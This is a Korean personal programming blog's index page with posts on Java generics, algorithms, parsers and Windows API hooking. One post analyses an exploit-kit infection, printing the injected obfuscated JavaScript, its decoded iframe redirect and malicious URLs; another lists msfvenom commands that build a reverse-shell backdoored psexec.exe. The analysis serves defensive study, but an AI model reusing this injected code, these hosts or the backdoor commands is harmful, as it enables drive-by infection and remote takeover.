
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>KC's blog</title>
  <meta name="author" content="KC">

  
  <meta name="description" content="Generic Array 를 new 할 수 없는 이유 It's because Java's array (unlinke generics) contain, at runtime, information
about its component type. So you must &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://zomo.heroku.com/posts/20/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="KC's blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">KC's blog</a></h1>
  
    <h2>A blogging framework for hackers.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="zomo.heroku.com">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/09/05/java-generic-array/">Java Generic Array</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-09-05T15:59:00+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>5</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>3:59 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://stackoverflow.com/a/2931240">Generic Array 를 new 할 수 없는 이유</a></p>

<pre><code>It's because Java's array (unlinke generics) contain, at runtime, information
about its component type. So you must know the component type when you create
the array. Since you don't know what `E` is at runtime, you can't create the
array.
</code></pre>

<p>테스트해본다.</p>

<pre><code>public class GenericSet&lt;E&gt; {
    private E a[];
    public GenericSet() {
        a = new E[1];
    }
}
</code></pre>

<p>역시 에러가 난다.</p>

<pre><code>code $ !javac
javac GenericSet.java
GenericSet.java:4: error: generic array creation
        a = new E[1];
            ^
1 error
</code></pre>

<p>Effective Java 를 찾아보았다.</p>

<p>Generic 의 array 생성이 허용되면 발생할 문제를 적어놓았다.</p>

<pre><code>import java.util.List;
import java.util.Arrays;

// Why generic array creation is illegal - won't compile!
List&lt;String&gt;[] stringLists = new List&lt;String&gt;[1];   // (1) 실제 컴파일하면 에러
List&lt;Integer&gt; intList = Arrays.asList(42);          // (2)
Object[] objects = stringLists;                     // (3)
objects[0] = intList;                               // (4)
String s = stringList[0].get(0);                    // (5)
</code></pre>

<ul>
<li>Line 3: legal (Arrays are covariant.)</li>
<li>Line 4: legal (The runtime type of a <code>List&lt;Integer&gt;</code> instance is <code>List</code>, and the runtime type of a List<Integer>[] instance is <code>List[]</code>, and the runtime type of a <code>List&lt;String&gt;</code> instance is <code>List[]</code>.)</li>
<li>Line 5: ClassCastException (The compiler automatically casts the retrieved element to <code>String</code>, but it&rsquo;s an <code>Integer</code>.)</li>
</ul>


<p><a href="http://docs.oracle.com/javase/tutorial/java/generics/erasure.html">Type Erasure: 컴파일타임때의 Generic 타입 정보가 runtime 때 사라지기때문에</a></p>

<p>즉, <code>List&lt;String&gt;</code> 과 <code>List&lt;Integer&gt;</code> 의 runtime type 은 모두 <code>List</code> 이다.</p>

<p>Java documentation 에서는 <a href="http://docs.oracle.com/javase/tutorial/java/generics/nonReifiableVarargsType.html#non-reifiable-types">Non-Reifiable Types</a> 라고 부르고 있다.</p>

<p>Stackoverflow 의 질문: <a href="http://stackoverflow.com/questions/529085/java-how-to-generic-array-creation">Java how to: Generic Array creation</a></p>

<p>Typecasting 을 해보았다.</p>

<pre><code>public class GenericSet&lt;E&gt; {
    private E a[];
    public GenericSet() {
        a = (E[]) new Object[1];
    }
}
code $ !j
javac GenericSet.java
Note: GenericSet.java uses unchecked or unsafe operations.
Note: Recompile with -Xlint:unchecked for details.
</code></pre>

<p>unchecked warning 이 나온다.</p>

<p><code>@SuppressWarnings({"unchecked"})</code> 을 사용.</p>

<pre><code>@SuppressWarnings({"unchecked"})
public class GenericSet&lt;E&gt; {
    private E a[];
    public GenericSet() {
        a = (E[]) new Object[1];
    }
}
code $ !j
javac GenericSet.java
</code></pre>

<p>Generic Array Creation 에 대해서 너무 타이트하게 컴파일타임에 규제하는게 아닌가 싶다.</p>

<p>어쨌든 Reflection 을 사용해서 Generic type array 를 만들어 본다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/09/03/shell-initialization/">Shell Initialization</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-09-03T23:28:00+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2013</span></span> <span class='time'>11:28 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="https://github.com/sstephenson/rbenv/wiki/Unix-shell-initialization">Unix shell initialization</a></p>

<h3>Shell modes</h3>

<ul>
<li>login shell - e.g. when you login from another host, or login at the text console of a local unix machine</li>
<li><p>interactive shells - ones connected to a terminal (or pseudo-terminal in the case of, say, a terminal emulator running under a windowing system).</p></li>
<li><p><code>-l</code>, <code>--login</code></p></li>
<li><code>-i</code></li>
</ul>


<p>.bashrc in only read by a shell that&rsquo;s both interactive and non-login.</p>

<h3>OS X</h3>

<ul>
<li>Opening a new Terminal window/tab: .bash_profile</li>
<li>Logging into a system via SSH: .bash_profile</li>
<li>Executing a command remotely with ssh or Capistrano: .bashrc</li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/29/the-long-goodbye/">The Long Goodbye</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-29T23:58:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>11:58 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>EK 가 설치되어 있는 사이트.</p>

<p>G마켓 자체 페이지는 아니고, 배송조회하면 연결되는 택배회사의 배송조회 페이지.</p>

<pre><code>URL: hxxp://www.yellowcap.co.kr/custom/inquiry_result.asp?INVOICE_NO=81800192001
</code></pre>

<p>페이지 소스를 보니,</p>

<pre><code>&lt;script type="text/javascript" language="javascript" src="/common/js/embed.js"&gt;&lt;/script&gt;
</code></pre>

<p>로 embed.js 를 땡기고 있었다.</p>

<p>embed.js 를 보니, 마지막에 다음과 같은 redirection code 가 들어있었다.</p>

<pre><code>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];
e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}
return p}('d(3.7.c(\'4=\')==-1){e 2=f h();2.g(2.i()+b*5*5*8);3.7=\'4=9;a=/;2=\'+2.j();
3.p("&lt;6 s=r://u.w/v/t/q/l.k m=n o=0&gt;&lt;/6&gt;")}',33,33,
'||expires|document|hsblm|60|iframe|cookie|1000|Yes|path|12|indexOf|if|var|new|setTime|Date|getTime|
toGMTString|html|ye|width|100|height|write|pop|http|src|goods|dangguro|upload|com'.split('|'),0,{}))
</code></pre>

<p>난독화 해제를 했더니,</p>

<pre><code>if (document.cookie.indexOf('hsblm=') == -1) {
    var expires = new Date();
    expires.setTime(expires.getTime() + 12 * 60 * 60 * 1000);
    document.cookie = 'hsblm=Yes;path=/;expires=' + expires.toGMTString();
    document.write("&lt;iframe src=http://dangguro.com/upload/goods/pop/ye.html width=100 height=0&gt;&lt;/iframe&gt;")
}
</code></pre>

<p>로 dangguro.com 으로 traffic 을 돌리는 iframe 을 삽입한다.</p>

<pre><code>URL: hxxp://dangguro.com/upload/goods/pop/ye.html
</code></pre>

<p>ye.html 을 봤더니</p>

<pre><code>&lt;iframe src=http://www.zzizile.net//data/geditor/1307/pop/index.html width='1' height='1'&gt;&lt;/iframe&gt;
</code></pre>

<p>로 다시 redirect 한다.</p>

<pre><code>URL: hxxp://www.zzizile.net//data/geditor/1307/pop/index.html
</code></pre>

<p>www.zzizile.net 을 따라가 보았다.</p>

<pre><code>&lt;script language="javascript" src="http://count5.51yes.com/click.aspx?id=52194144&amp;logo=1" charset="gb2312"&gt;&lt;/script&gt;
&lt;script type="text/javascript" src="swfobject.js"&gt;&lt;/script&gt;
&lt;script src=jpg.js&gt;&lt;/script&gt;
&lt;script type="text/javascript"&gt;
var tmoRu2=navigator.userAgent.toLowerCase();
var NOmT2="1"+"1"+"1";
if(document.cookie.indexOf("YCAo6=")==-1 &amp;&amp; tmoRu2.indexOf("linux")&lt;=-1 &amp;&amp; tmoRu2.indexOf("bot")==-1 &amp;&amp; tmoRu2.indexOf("spider")==-1)
{
var VJhjJoY8=deconcept.SWFObjectUtil.getPlayerVersion();
var expires=new Date();
expires.setTime(expires.getTime()+24*60*60*1000);
NOmT2="0"+"0";
document.cookie="YCAo6=Yes;path=/;expires="+expires.toGMTString();
if(document.location.hostname.length&gt;0){pimOD5="1"+"1";delete pimOD5;try{pimOD5+=
"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0";}catch(e){var IzhH1="1";AMJP8 = eval}mOQyUG8=unescape;}
gROR3="3C7F265941303D6B32471514405B3D4439482417BE6D1343C4453A0FA317510ABF19510EAB045234FF580122B3
421825FB560261C0511620C225542CD621EE38DA24E031C763FE11DE25E84F9969F319817BBC54CE57EF12B541FA18A501C01FB654
...
</code></pre>

<p>로 시작하는 heavily obfuscated 된 자바스크립트가 나온다.</p>

<p>swfobject.js 가 있는 것으로 봐서, 여기서부터 Browser fingerprinting 을 해서, 취약한 부분을 찾아내,
적절한 공격을 하는 것으로 보인다.</p>

<p>일단 이 화일을 VirusTotal 에 올려보았다.</p>

<p>45 개의 Anti-virus 엔진중에서 19 개가 악성으로 판정하였다. 국산 엔진들은 잡아내지 못했다.</p>

<p>McAfee 는 JS/Exploit-Godakit.a 라고 판정하고 BitDefender 는 JS:Exploit.BlackHole.AL 이라고 판정하였다.</p>

<p>사용된 화일로 봐서는, Gong Da 가 맞다.</p>

<p>Sandbox 에 넣고 돌렸다.</p>

<p>튀어나오는 URL 들은</p>

<pre><code>http://www.uthkorea.com

http://www.monggus.com

http://count18.51yes.com

http://211.43.212.192

http://101.79.5.31
</code></pre>

<p>이다. count18.51yes.com 은 China Telecom Jiangsu 라는 업체에서 호스팅하고 있다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/29/reflective-dll-injection/">Reflective DLL Injection</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-29T13:00:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>1:00 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>손을 대야 할 것들이</p>

<ul>
<li>Reflective DLL injection</li>
<li>Dynamic forking</li>
<li>Inline hooking</li>
</ul>


<p><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">stephenfewer/ReflectiveDLLInjection</a>
을 읽고.</p>

<pre><code>Reflective DLL injection is a library injection technique in which the concept
of reflective programming is employed to perform the loading of a library from
memory into a host process.
</code></pre>

<p>Reflective programming 이라 함은,</p>

<pre><code>In computer science, reflection is the ability of a computer program to
examine and modify the structure and behavior (specifically the values,
meta-data, properties and functions) of an object at runtime.
</code></pre>

<p>우선 Metasploit Patch</p>

<pre><code>msfvenom -p windows/shell_reverse_tcp -x psexec.exe ... The overwrite program entry method
msfvenom -p windows/shell_reverse_tcp -x psexec.exe -k ... The aloocate and create thread and return to original program entry method (Keep)
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/29/kargers-algorithm/">Karger's Algorithm</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-29T12:39:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:39 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h3>Karger&rsquo;s Algorithm</h3>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/28/karatsuba-algorithm/">Karatsuba Algorithm</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-28T02:19:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>2:19 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h3>Karatsuba Algorithm</h3>

<p>Karatsuba 가 23 살때 발명한 알고리즘.</p>

<pre><code>def kara(x,y):
    n = len(str(x))
    n2 = pow(10,n/2)
    a = x / n2
    b = x % n2
    c = y / n2
    d = y % n2
    ans = pow(10,n)*a*c + pow(10,n/2)*(a*d+b*c) + b*d

    return ans

if __name__ == "__main__":
    x = 4586
    y = 1234
    ans = kara(x,y)
    print "%d == %d" % (ans, x*y)
</code></pre>

<p>여기서 n-digit 숫자간의 곱셈을 n/2-digit 숫자간의 곱셈으로 divide 할 수 있다.
recursive 하게 적용하면, n-digit by n-digit 을 곱하는 일반적인 곱셈의 복잡도 Theta(N<sup>2</sup>)
를 Theta(N^\log_2 3) 으로 낮출 수 있다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/22/elementary-cellular-automata/">Elementary Cellular Automata</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-22T00:34:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2013</span></span> <span class='time'>12:34 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="http://mathworld.wolfram.com/ElementaryCellularAutomaton.html">Elementary Cellular Automaton</a> 를 1 라인으로 구현한 코드.</p>

<p><a href="http://www.ioccc.org/2012/konno/konno.c">Best one liner: konno.c</a></p>

<p>konno.c</p>

<pre><code>int _;main(O,l,o)char**l,**o;{_++&gt;&gt;9||main(1&amp;(o?(int)o:O)|O*2,l,
putchar(_%32?atoi(1[l])&gt;&gt;(7&amp;O&lt;&lt;!o&gt;&gt;!o+29)&amp;32&lt;_|_==16?35:32:10)%10);}
</code></pre>

<p>이것을 해독해보았다.</p>

<pre><code>int pos=0;

void p_b(int x)
{
    int b[33];
    char *p;
    int i;
    unsigned int j;

    memset(b,0,33);
    for(i=32, j=(1L&lt;&lt;31); i&gt;0; i--,j&gt;&gt;=1)
        *p++=(x&amp;j) ==j ? '1':'0';
    return b;
}

main(evolution_seq,argv,prev_cell)
int evolution_seq;
char **argv;
int prev_cell;
{
    /* recurse from pos=1 to pos=512 */
    if (pos++ &lt; 32*16) {
        int cell_color;

        /* Fill the 1st line with seed value */
        if (pos == 16)
            cell_color = '#';       /* The 1st line: the mid pos is '#' */
        else if (pos &lt; 32)
            cell_color = ' ';       /* The 1st line: fill with ' ' except the mid pos */
        else if (pos % 32 == 0)
            cell_color = '\n';      /* Print newline for every 32nd pos */
        else {
            int rule;

            /* 
            * Get the hight-order 3 bits of evolution sequence
            * (clears MSB if the previous cell was new-line)
            * and shift rule bits by it.
            */
            if (prev_cell == '\n')
                rule = atoi(argv[1]) &gt;&gt; (evolution_seq &lt;&lt; 1 &gt;&gt; 30 &amp; 0x7);  
            else
                rule = atoi(argv[1]) &gt;&gt; (evolution_seq &gt;&gt; 29 &amp; 0x7);

            if (rule &amp; 0x1)
                cell_color = '#'; /* black */
            else
                cell_color = ' '; /* white */
        }        
        putchar(cell_color);

        if (prev_cell == '#') { 
            evolution_seq = evolution_seq * 2 + 1;
        } else 
            evolution_seq = evolution_seq * 2; 

        main(evolution_seq, argv, cell_color);
    }
}

~% gcc k.c -o k
~% ./k 126
               #               
              ###              
             ## ##             
            #######            
           ##     ##           
          ####   ####          
         ##  ## ##  ##         
        ###############        
       ##             ##       
      ####           ####      
     ##  ##         ##  ##     
    ########       ########    
   ##      ##     ##      ##   
  ####    ####   ####    ####  
 ##  ##  ##  ## ##  ##  ##  ## 
###############################
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/20/recursive-things/">Recursive Things</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-20T12:15:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:15 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>&ldquo;알고리즘 문제 해결 전략&rdquo; 이라는 책을 읽고 있다. algospot.com 의 운영자가 쓴 책이다.</p>

<h3>Combination</h3>

<p>1 ~ 9 사이의 숫자를 4 개 뽑는 combination 구하기.</p>

<pre><code>def pick(selection, last):
    if len(selection) == 4:
        print selection
        return
    for i in range(last+1,9):
        selection.append(i)
        pick(selection, i)
        selection.remove(i)

if __name__ == "__main__":
    selection = []
    pick(selection, 0)
</code></pre>

<h3>음식 대접</h3>

<p>음식을 가리는 4 명의 사람들에게 6 가지의 메뉴 중, 최소한의 메뉴를 준비해서 대접하는 문제.</p>

<pre><code>answer = []

def OK(menu):
    bit = 0
    if 1 in menu:
        bit = bit | 0b1100
    if 2 in menu:
        bit = bit | 0b1001
    if 3 in menu:
        bit = bit | 0b0101
    if 4 in menu:
        bit = bit | 0b0001
    if 5 in menu:
        bit = bit | 0b0110
    if 6 in menu:
        bit = bit | 0b1010

    if bit == 0b1111:
        return True
    else:
        return False

def Explore(menu, depth):
    if depth == 7:
        if OK(menu):
            answer.append( (len(menu), list(menu)) )
            return len(menu)
        else:
            return 987654321
    menu.append(depth)
    size = Explore(menu, depth + 1)
    menu.pop()
    size2 = Explore(menu, depth + 1)
    if size &lt; size2:
        return size
    else:
        return size2

if __name__ == "__main__":
    menu = []
    min = Explore(menu,1)
    for (x,y) in answer:
        if x == min:
            print y
</code></pre>

<h3>구간 max</h3>

<p>Recursive algorithm 은 아니지만.</p>

<p>{ 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, -28, 9, 10, -12, 13, 5 } 라는 어레이에서 summation_from_i_to_j 가 가장 큰 index i, j 를 찾는 문제. 무식하지 않게 하는 것이 포인트.</p>

<p>우선 O(N<sup>2</sup>) 으로 하는 방법은 간단하다.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

main()
{
    int a[] = { 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, 0, 9, 10, -28, 13, 5 };
    int N = sizeof a / sizeof (int);

    int i,j;
    int max = 1 &lt;&lt; (sizeof(int) * 8 - 1);
    int sum;
    int _i,_j;

    for (i = 0; i &lt; N; i++) {
        sum = 0;
        for (j = i; j &lt; N; j++) {
            sum += a[j];
            if (sum &gt; max) {
                max = sum;
                _i = i;
                _j = j;
            }
        }
    }
    printf("sum(%d, %d) = %d\n", _i, _j, max);
}
</code></pre>

<p>O(N) 알고리즘.</p>

<ol>
<li>과거를 잊고 새로 summation 을 시작해야 할지를 계속 결정해야 한다.</li>
<li>과거가 minus 라면 싹 잊고 새로 시작하는 것이 낫다.</li>
<li>과거가 그래도 plus 라면 구간합을 올리는데 도움은 된다.</li>
<li>음수인 구간합은 의미가 없다. 0 이 낫다.</li>
<li>i 까지의 최대구간합은 maxAt(i) = max( 0, maxAt(i-1) ) + a[i]</li>
</ol>


<p>등을 가지고 만들어본다.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define MAX(a,b) (a &gt; b ? a : b)
sum2() 
{
    int a[] = { 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, 0, 9, 10, -28, 13, 5 };
    int N = sizeof a / sizeof (int);
    int partial_sum = 0;
    int max = 1 &lt;&lt; (sizeof(int) * 8 - 1);
    int i;

    for (i = 0; i &lt; N; ++i) {
        partial_sum = MAX(partial_sum, 0) + a[i];
        max = MAX(partial_sum, max);
    }
    printf("max %d\n", max);
    return max;
}
</code></pre>

<p>여기서 구간을 알아내도록 고쳐보면,</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int _start = 0;
int _end = 0;

sum2() 
{
    int a[] = { 5, -2, 4, -18, 8, 10, -7, 5, 8, 4, 3, -7, -2, 5, 8, 0, 9, 10, -28, 13, 5 };
    int N = sizeof a / sizeof (int);
    int partial_sum = 0;
    int max = 1 &lt;&lt; (sizeof(int) * 8 - 1);
    int i;

    for (i = 0; i &lt; N; ++i) {
        if (partial_sum &lt; 0) {
            partial_sum = a[i];
            _start = i;
        } else
            partial_sum = partial_sum + a[i];

        if (partial_sum &gt; max) {
            max = partial_sum;
            _end = i;
        } 
    }
    return max;
}
main(){printf("sum(%d-%d) = %d\n",_start,_end,sum2());}
</code></pre>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/08/20/windows-api-hooking/">Windows API Hooking</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-08-20T09:37:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>9:37 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>몇 가지 Windows API Hooking 라이브러리를 테스트 해보기로 했다.</p>

<p>Microsoft 의 Detours. x86 버전만 free 이고, x64 버전은 돈을 받는다. 탈락.</p>

<p><a href="http://www.codeproject.com/Articles/44326/MinHook-The-Minimalistic-x86-x64-API-Hooking-Libra">MinHook - The Minimalistic x86/x64 API Hooking Library</a> 을 발견.</p>

<p>읽고 정리해본다.</p>

<p>Inline hooking 을 하는 듯 하다.</p>

<p>Target funciton 의 진입 부분을 JMP 로 overwrite 한다.</p>

<p>x86 모드에서는 Target function 이 0x4000 0000 부근에 있다고 가정하면,
5 bytes 를 차지하는 32bit relative JMP 로 커버 가능하다.</p>

<pre><code>0x4000 0000: E9 FB FF FF BF           JMP 0x0
0x4000 0000: E9 FA FF FF BF           JMP 0xFFFFFFFF 
</code></pre>

<p>Target funciton (i.e. USER32.dll!MessageBoxW) 의 진입부분을 JMP 로 overwrite 하고,
Detour 로 뛰었다가, 다시 원래 코드로 돌아가야 한다.</p>

<p>이 부분을 Trampoline Function 이라고 부르는데, &ldquo;원래 함수의 앞부분을 클론한 것&rdquo; +
&ldquo;JMP to 원래 함수&rdquo; 로 이루어져 있다.</p>

<pre><code>; Original
0x770E 11E4: 48 83 EC 38              SUB RSP, 0x38
0x770E 11E8: 45 33 DB                 XOR R11D, R11D
; Trampoline
0x7706 4BD0: 48 83 EC 38              SUB RSP, 0x38
0x7706 4BD4: 45 33 DB                 XOR R11D, R11D
0x7706 4BD7: FF 25 5B E8 FE FF        JMP QWORD NEAR [0x77053438]
0x7705 3438: EB 11 0E 77 00 00 00 00
</code></pre>

<p>Visual Studio 2013 으로 빌드해서 테스트해보니 잘 동작한다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/06/23/antlr-and-language-implementation-patterns/">ANTLR &amp; Language Implementation Patterns</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2013-06-23T11:26:00+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>23</span><span class='date-suffix'>rd</span>, <span class='date-year'>2013</span></span> <span class='time'>11:26 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>ANTLR 의 개발자 T.P. 가 Pragmatic 에서 책을 두 권 출판했다.</p>

<p>처음 예제는 List Parser 를 만드는 것.</p>

<p>리스트라 함은.</p>

<p>[ a,b,c] 나 [a, [x,y,z], b, c]</p>

<p>같은 것들.</p>

<h3>Token</h3>

<p>Token 을 보관하는 데이터 구조.</p>

<p>Type 과 Text 로 이루어져있고,</p>

<p>Type 으로는</p>

<pre><code>T_EOF
T_NAME
T_COMMA
T_LBRACK
T_RBRACK
</code></pre>

<p>등이 있다.</p>

<p>Text 에는 &ldquo;<EOF>&rdquo;, &ldquo;NAME&rdquo;, &ldquo;COMMA&rdquo;, &ldquo;LBRACK&rdquo;, &ldquo;RBRACK&rdquo; 등이.</p>

<p>Token class 의 method 로는,</p>

<p>new_token / print_token 정도.</p>

<h3>LL(1) Parser</h3>

<p>기본적인 사상은,</p>

<p>lookahead 오퍼레이션과 consume 을 분리하는 것.</p>

<p>LL(1) Parser 에서는 말장난같지만, LL(k) Parser 로 가면 개념이 명료해짐.</p>

<p>기본적인 함수는 nextToken() - 버퍼를 tokenize 하는 함수.</p>

<p>whitespace 는 consume 해버린다.</p>

<p>&lsquo;,&rsquo;, &lsquo;[&rsquo;, &lsquo;]&rsquo; 을 만나면, consume 하고, 새로운 토큰을</p>

<pre><code>new_token(T_LBRACK, "[") 
new_token(T_RBRACK, "]") 
new_token(T_COMMA, ",") 
</code></pre>

<p>등으로 만들어 리턴.</p>

<p>Character buffer 를 tokenizing 해서 token stream 으로 변환.</p>

<h3>LL(k) Parser</h3>

<p>LL(k) Parser 는 lookahead 를 몇 개 앞의 토큰까지 보고 판단하느냐가 핵심.</p>

<p>1 개의 lookahead 만 가지고 파싱을 진행할 수 있는 문법이 있는가하면,</p>

<p>불가능한 문법도 있기 때문에, LL(k) Parser 가 필요.</p>

<p>LL(1) 에서는 lookahead 토큰 하나만 가지고 했다면, LL(4) 에서는 4 개의 lookahead 토큰을 가지고 파싱 작업을 수행하게 된다.</p>

<p>LIST 를 그래머로 기술하면,</p>

<pre><code>list : '[' elements ']' ;
elements : element (',' element)* ;
element : NAME | list

[ a, b, c ] 
[ a, [ x, y, z ], b ] 
</code></pre>

<p>등을 기술할 수 있다.</p>

<p>위의 그래머는 다음 코드로 변환된다.</p>

<pre><code>list() { match(T_LBRACK); elements(); match(T_RBRACK); }
elements() { element(); if (lookahead.type == T_COMMA) { match(T_COMMA); elements(); } }
element() { 
  if (lookahead.type == T_NAME) match(T_NAME);
  else if (lookahead.type == T_LBRACK) list();
  else throw new Error("unexpeced: " + lookahead.type);
}
</code></pre>

<p>결국 해보니, 위의 그래머는 lookahead 하나만 가지고 구현 가능하다. LL(1).</p>

<p>그럼 LL(2) 파서가 필요한 그래머를 만들어본다.</p>

<pre><code>list : '[' elements ']' ;
elements : element (',' element)* ;
element : NAME '=' NAME | NAME | list ;
</code></pre>

<p><code>NAME = NAME</code> 과 <code>NAME</code> 이 동일한 <code>NAME</code> 으로 시작하기때문에, one lookahead 만으로는
파싱이 불가능하다. two lookaheads 를 유지하도록 한다.</p>

<p>Circular Lookahead Buffer 를 만들어 관리.</p>

<p>[a,b,c] 를 LL(4) 에서 예제.</p>

<pre><code>lookahead[0] '[' &lt;-- bp
lookahead[1] 'a'
lookahead[2] ','
lookahead[3] 'b'
</code></pre>

<p>가 초기 상태. 4 개의 lookahead 를 가지게 된다.</p>

<p>초기 lookahead 버퍼를 셋업하는 방법은,</p>

<pre><code>lookahead[bp] = lexer.getToken();
bp = (bp+1) % k;
</code></pre>

<p>를 k 번 만큼하면, <code>lookahead[0]</code> ~  <code>lookahead[k-1]</code> 까지의 버퍼가 토큰으로 채워지고, bp 는 0 으로 돌아와서, 처음을 가리키게 된다.
버퍼도 채우고, 맨 처음도 가리키고.</p>

<p>consume 을 한번 하면.</p>

<pre><code>lookahead[0] ','
lookahead[1] 'a' &lt;-- bp
lookahead[2] ','
lookahead[3] 'b'
</code></pre>

<p>첫 &lsquo;[&rsquo; 는 discard 되고, base pointer 가 전진했으며, 4 개의 lookahead 를 maintain 하기 위해, 새로운 &lsquo;,&rsquo; 가 들어왔다.</p>

<pre><code>lookahead = new Token[4];
for (i=0;i&lt;4;i++) lookahead[i] = lexer.nextToken();
bp = 0;
</code></pre>

<p>하면 초기 CLB 셋업이 끝난다.</p>

<pre><code>consume() { lookahead[bp] = lexer.nextToken(); bp = (bp + 1) % 4; }
</code></pre>

